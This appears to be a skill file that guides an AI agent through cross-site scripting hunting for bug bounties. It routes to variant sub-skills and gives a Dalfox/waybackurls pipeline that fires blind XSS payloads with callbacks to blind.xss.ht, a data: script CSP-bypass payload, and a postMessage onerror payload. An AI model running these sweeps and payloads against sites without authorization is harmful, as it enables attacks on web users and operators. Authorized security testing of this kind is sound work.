---
name: attack-xss
description: "Cross-site scripting router — pick the variant sub-skill (reflective / stored / DOM / blind) first, then Dalfox automation, CSP bypass, postMessage XSS"
category: "client-side"
version: "2.0"
author: "bountyreper-official"
tags:
  - xss
  - csp
  - dalfox
  - postmessage
  - reflective
  - stored
  - dom
  - blind
tech_stack:
  - web
cwe_ids:
  - CWE-79
chains_with:
  - attack-account-takeover
  - attack-html-injection
prerequisites: []
---

# XSS Hunting

## Route first — load the variant sub-skill

XSS has four genuinely different methodologies. Determine the variant from what you
have observed, load that sub-skill, and work from it. Do not improvise payloads before
the context is known — that is how XSS turns into false positives.

| What you observed | Variant | Load |
|---|---|---|
| Input echoed in the same HTTP response | Reflected | `skill(action="load", name="attack-xss-reflective")` |
| Input persisted, rendered for OTHER users/admins | Stored | `skill(action="load", name="attack-xss-stored")` |
| No server reflection; payload reaches a JS sink (hash, postMessage, JSON→HTML) | DOM | `skill(action="load", name="attack-xss-dom")` |
| No idea where it renders (admin queues, staff reviews) | Blind | `skill(action="load", name="attack-xss-blind")` |

Sub-skill files: `reflective`, `stored`, `dom`, `blind` (under `attack-xss/`).

## Cross-cutting automation (use with any variant)

### Automation (Dalfox + Wayback + GF)

```bash
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u > possible.txt
cat possible.txt | dalfox pipe --skip-bav -b blind.xss.ht
# Blind XSS sweep
waybackurls target.com | gf xss | dalfox -b blind.xss.ht pipe
```

### CSP Bypass

```bash
curl -s -D- https://target.com | grep -i content-security-policy
# If unsafe-inline or data: allowed, XSS possible
# Test with: <script src=data:text/javascript,alert(1)>
```

### postMessage XSS

```js
window.addEventListener('message', e => console.log(e.data))
// Fuzz: window.postMessage("<img src=x onerror=alert(1)>", "*")
```

Delivering via postMessage lands in DOM sinks → work from attack-xss-dom.

## Evidence rule (all variants)

Reflection or storage alone is CANDIDATE evidence. Confirmed requires the observed
execution: headless browser alert/console capture, or an OOB callback (interactsh /
Burp Collaborator) from the payload. No execution proof → the report is capped.

## References

- [HowToHunt — XSS](https://github.com/KathanP19/HowToHunt/tree/master/XSS)
